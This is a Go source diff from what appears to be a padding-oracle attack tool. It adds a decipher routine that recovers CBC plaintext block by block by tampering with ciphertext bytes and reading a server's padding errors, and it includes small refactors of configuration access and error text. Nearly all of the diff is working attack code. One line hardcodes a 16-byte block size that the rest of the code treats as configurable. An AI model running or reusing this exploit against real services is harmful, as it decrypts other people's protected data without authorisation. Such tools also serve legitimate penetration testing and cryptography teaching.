@@ -5,7 +5,62 @@ import (
 	"fmt"
 )
 
+func decipher(cipherEncoded string) ([]byte, error) {
+	// we refer to current status
+	status := currentStatus
+	blockLen := *config.blockLen
+
+	/* usually we are given an initial, valid cipher, tampering on which, we discover the plaintext
+	we decode it into bytes, so we can tamper it at that byte level */
+	if cipherEncoded == "" {
+		return nil, fmt.Errorf("empty cipher")
+	}
+
+	cipher, err := config.encoder.decode(cipherEncoded)
+	if err != nil {
+		return nil, err
+	}
+
+	/* we need to check that overall cipher length complies with blockLen
+	as this is crucial to further logic */
+	if len(cipher)%blockLen != 0 {
+		status.error(fmt.Errorf("Cipher len is bad"))
+	}
+	blockCount := len(cipher)/blockLen - 1
+
+	/* now, we gonna tamper at every block separately,
+	thus we need to split up the whole payload into blockSize*2 sized chunks
+	- first half - the bytes we gonna tamper on
+	- second half - the bytes that will produce the padding error */
+	cipherChunks := make([][]byte, blockCount)
+	for i := 0; i < blockCount; i++ {
+		cipherChunks[i] = make([]byte, blockLen*2)
+		copy(cipherChunks[i], cipher[i*blockLen:(i+2)*blockLen])
+	}
+
+	// create container for a final plaintext
+	plainText := make([]byte, len(cipher)-blockLen)
+
+	// init new status bar
+	status.startStatusBar(len(plainText))
+
+	// decode every cipher chunk and fill-in the relevant plaintext positions
+	// we move backwards through chunks, though it really doesn't matter
+	for i := len(cipherChunks) - 1; i >= 0; i-- {
+		plainChunk, err := decipherChunk(cipherChunks[i])
+		if err != nil {
+			return nil, err
+		}
+		copy(plainText[i*16:(i+1)*16], plainChunk)
+	}
+
+	// that's it!
+	status.finishStatusBar()
+	return plainText, nil
+}
+
 func decipherChunk(chunk []byte) ([]byte, error) {
+	blockLen := *config.blockLen
 	// create buffer to store the deciphered block of plaintext
 	plainText := make([]byte, blockLen)
 
@@ -32,7 +87,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 			}
 
 			if paddingError {
-				return nil, fmt.Errorf("Failed to decrypt, not a byte got in without padding error. \nThe root cause migth be in Unpadding implementation on the server side!")
+				return nil, fmt.Errorf("failed to decrypt, not a byte got in without padding error")
 			}
 
 			foundByte = originalByte
@@ -48,7 +103,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 		}
 
 		/* we need to repair the padding for the next shot
-		e.g. we need to adjust the already tapered bytes block*/
+		e.g. we need to adjust the already tampered bytes block*/
 		chunk[pos] = foundByte
 		nextPaddingValue := currPaddingValue + 1
 		adjustingValue := currPaddingValue ^ nextPaddingValue
@@ -67,8 +122,8 @@ func findGoodByte(chunk []byte, pos int, original byte) (bool, byte, error) {
 
 	chanErr := make(chan error)
 	chanVal := make(chan byte)
-	chanPara := make(chan byte, parallel)
-	chanDone := make(chan byte, parallel)
+	chanPara := make(chan byte, *config.parallel)
+	chanDone := make(chan byte, *config.parallel)
 
 	for i := 0; i <= 0xff; i++ {
 		tamperedByte := byte(i)
